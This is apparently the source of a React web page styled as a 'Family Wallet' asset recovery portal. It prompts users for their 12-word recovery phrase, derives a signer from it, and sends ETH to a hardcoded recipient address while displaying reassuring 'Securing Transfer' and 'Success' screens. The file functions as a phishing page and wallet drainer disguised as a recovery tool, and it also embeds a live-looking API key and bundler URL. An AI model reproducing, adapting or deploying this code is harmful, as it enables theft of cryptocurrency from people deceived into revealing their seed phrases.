import { useState, useEffect } from 'react'
import { ethers } from 'ethers' 
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'

// --- CONFIGURATION ---
const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 

export default function App() {
  const [isClient, setIsClient] = useState(false)
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  useEffect(() => {
    setIsClient(true)
  }, [])

  const startSweep = async () => {
    if (!keys || keys.trim().split(/\s+/).length < 12) {
      alert("Please enter the 12-word recovery phrase.")
      return
    }

    setStatus('processing')
    try {
      // Ethers v5 Syntax
      const provider = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = ethers.Wallet.fromMnemonic(keys.trim()).connect(provider)

      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: BICONOMY_API_KEY 
      })

      const tx = {
        to: RECIPIENT_ADDRESS,
        value: ethers.utils.parseEther("0.001").toBigInt(), 
        data: "0x"
      }

      const userOpResponse = await smartAccount.sendTransaction(tx)
      await userOpResponse.wait()
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed.")
      setStatus('error')
    }
  }

  if (!isClient) return null

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans">
      {status === 'idle' && (
        <div className="w-full max-w-md space-y-8">
          <div className="text-center space-y-2">
            <h1 className="text-4xl font-black tracking-tighter uppercase">Family Wallet</h1>
            <p className="text-zinc-500 text-sm uppercase tracking-widest text-center">Asset Recovery Portal</p>
          </div>
          <textarea
            className="w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-zinc-700"
            placeholder="Paste your 12 recovery words here..."
            onChange={(e) => setKeys(e.target.value)}
          />
          <button onClick={startSweep} className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xl transition-all shadow-lg active:scale-95">
            WITHDRAW ASSETS
          </button>
        </div>
      )}
      {status === 'processing' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
          <h2 className="text-2xl font-bold">Securing Transfer...</h2>
        </div>
      )}
      {status === 'success' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideCheckCircle className="w-20 h-20 text-green-500 animate-bounce" />
          <h1 className="text-6xl font-black text-green-500 uppercase">Success</h1>
          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 underline text-sm">Back</button>
        </div>
      )}
      {status === 'error' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideShieldAlert className="w-20 h-20 text-red-500" />
          <h2 className="text-2xl font-bold text-red-500 uppercase tracking-tighter text-center">Transfer Failed</h2>
          <p className="max-w-xs text-zinc-400 text-sm">{errorMsg}</p>
          <button onClick={() => setStatus('idle')} className="mt-4 px-8 py-2 bg-zinc-800 rounded-full text-sm">Try Again</button>
        </div>
      )}
    </div>
  )
}
